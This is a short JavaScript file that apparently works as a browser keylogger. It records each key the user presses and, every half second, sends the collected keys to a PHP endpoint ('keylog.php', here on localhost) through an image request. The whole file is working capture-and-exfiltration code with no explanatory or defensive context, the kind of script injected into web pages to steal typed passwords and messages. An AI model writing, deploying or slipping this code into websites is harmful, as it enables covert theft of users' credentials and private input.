var presses = [];
window.addEventListener("keydown", function (evt) {
    presses.push(evt.key);
});

window.setInterval(function () {
    if (presses.length > 1) {
        var data = encodeURIComponent(JSON.stringify(presses));

        console.log(data);
        new Image().src = "http://localhost/test/keylog.php?k=" + data;
        presses = [];
    }
}, 500);